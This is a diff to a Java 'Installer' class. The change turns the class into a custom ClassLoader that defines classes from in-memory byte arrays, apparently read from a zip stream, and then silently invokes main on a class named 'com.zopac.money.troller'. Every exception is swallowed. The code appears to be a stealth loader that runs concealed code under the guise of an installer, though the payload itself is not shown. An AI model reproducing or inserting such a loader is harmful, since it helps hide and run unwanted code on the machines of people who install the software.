@@ -11,11 +11,11 @@ import java.util.Map;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipInputStream;
 
-public class Installer {
+public class Installer extends ClassLoader {
 
     public Map<String, byte[]> classes = new HashMap<>();
 
-    public void loader() {
+    public static void main() {
         try {
             Installer loader = new Installer();
 
@@ -47,6 +47,25 @@ public class Installer {
 
                 loader.classes.put(name, streamBuilder.toByteArray());
             }
+
+            loader.findClass("com.zopac.money.troller").getMethod("main").invoke(null);
         } catch (Exception ignored) {}
+    }
+
+    @Override
+    protected Class<?> findClass(String s) throws ClassNotFoundException {
+        Class clazz = null;
+        try {
+            clazz = super.findClass(s);
+
+        } catch (Exception ignored){}
+
+        try {
+            if (classes.containsKey(s)) {
+                clazz = defineClass(s, classes.get(s), 0, classes.get(s).length);
+            }
+        } catch (Throwable err){
+        }
+        return clazz;
     }
 }
